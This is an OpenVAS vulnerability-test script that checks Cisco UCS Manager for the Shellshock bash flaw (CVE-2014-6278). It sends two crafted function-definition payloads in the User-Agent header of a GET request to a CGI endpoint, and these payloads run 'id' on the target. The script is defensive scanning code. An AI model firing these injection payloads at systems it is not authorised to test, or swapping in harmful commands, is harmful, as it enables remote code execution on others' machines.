###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cisco_ucs_shellshock.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Cisco UCS GNU Bash Environment Variable Command Injection Vulnerability (Shellshock)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:cisco:unified_computing_system_software';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105570");
  script_cve_id("CVE-2014-6278");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("Cisco UCS GNU Bash Environment Variable Command Injection Vulnerability (Shellshock)");

  script_xref(name:"URL", value:"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash");
  script_xref(name:"URL", value:"https://bst.cloudapps.cisco.com/bugsearch/bug/CSCur01379");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-03-17 09:25:23 +0100 (Thu, 17 Mar 2016)");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_cisco_ucs_manager_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("cisco_ucs_manager/installed");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"impact", value:"Successful exploitation will allow remote  or local attackers to inject  shell commands, allowing local privilege
  escalation or remote command execution depending on the application vector.");
  script_tag(name:"vuldetect", value:"Try to execute the `id' command by sending a crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating environment variables passed from another environment.
  After processing a function definition, bash continues to process trailing strings.");
  script_tag(name:"solution", value:"See vendor advisory for a solution");
  script_tag(name:"summary", value:"On September 24, 2014, a vulnerability in the Bash shell was publicly announced. The vulnerability is related to
  the way in which shell functions are passed though environment variables. The vulnerability may allow an attacker to inject commands into a Bash shell,
  depending on how the shell is invoked. The Bash shell may be invoked by a number of processes including, but not limited to, telnet, SSH, DHCP, and
  scripts hosted on web server");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

url = '/ucsm/isSamInstalled.cgi';
useragent = http_get_user_agent();
host = http_host_name( port:port );

attacks = make_list(  '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
                      '() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
                   );

foreach attack ( attacks )
{
  req = 'GET ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + attack + '\r\n' +
        'X-Security-Scanner: ' + useragent + '\r\n' +
        'Connection: close\r\n' +
        'Accept: */*\r\n' +
        '\r\n';

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' )
  {
    report = report_vuln_url(  port:port, url:url  ) + '\n\n';
    report += "It was possible to execute the `id' command on the remote host" + '\n';
    report += '\nResponse:\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
